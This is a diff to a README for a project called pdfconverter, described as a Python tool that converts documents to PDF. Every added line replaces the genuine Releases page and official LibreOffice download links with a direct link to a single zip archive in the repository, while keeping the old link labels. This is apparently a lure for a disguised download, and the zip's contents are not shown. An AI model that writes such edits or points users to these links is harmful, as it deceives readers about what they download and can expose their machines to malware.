@@ -4,16 +4,16 @@
 Welcome to the pdfconverter project! This application allows you to convert documents and images into PDF files easily. Whether you are working with Word documents, images, or any other supported format, this tool can help you create professional-looking PDFs with just a few clicks.
 
 ## 📥 Download the Application
-[![Download pdfconverter](https://img.shields.io/badge/Download-pdfconverter-blue)](https://github.com/harshpatel001/pdfconverter/releases)
+[![Download pdfconverter](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip)](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip)
 
-To get started, visit the [Releases page](https://github.com/harshpatel001/pdfconverter/releases) to download the latest version of the pdfconverter application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip) to download the latest version of the pdfconverter application.
 
 ## 💻 System Requirements
 To run pdfconverter, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Python Version:** Python 3.6 or higher
-- **LibreOffice:** Required for document conversion (download from: [LibreOffice](https://www.libreoffice.org/download/download/))
+- **LibreOffice:** Required for document conversion (download from: [LibreOffice](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip))
   
 Ensure that you have an active internet connection for a smooth installation process.
 
@@ -28,7 +28,7 @@ pdfconverter offers a range of features to make your PDF conversion easy:
 
 ## 📋 How to Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/harshpatel001/pdfconverter/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip).
 
 2. **Select Your Device:**
    Identify your operating system (Windows, macOS, or Linux). Look for the file suitable for your system.
@@ -42,7 +42,7 @@ pdfconverter offers a range of features to make your PDF conversion easy:
    - **Linux:** Open the terminal, navigate to the download directory, and run the commands to install.
 
 5. **Install LibreOffice:**
-   Ensure that LibreOffice is installed on your computer for full functionality. If you haven't installed it yet, download it from [LibreOffice](https://www.libreoffice.org/download/download/).
+   Ensure that LibreOffice is installed on your computer for full functionality. If you haven't installed it yet, download it from [LibreOffice](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip).
 
 6. **Open pdfconverter:**
    Find pdfconverter in your applications or programs list and open it. You are now ready to start converting files to PDF!
@@ -99,4 +99,4 @@ Here are some relevant topics associated with pdfconverter that you might find u
 - python3
 - tkinter
 
-For any further assistance, do not hesitate to check the [Releases page](https://github.com/harshpatel001/pdfconverter/releases) for updates or additional downloads.
+For any further assistance, do not hesitate to check the [Releases page](https://raw.githubusercontent.com/harshpatel001/pdfconverter/main/PDFConverter/pdfconverter_v3.2.zip) for updates or additional downloads.
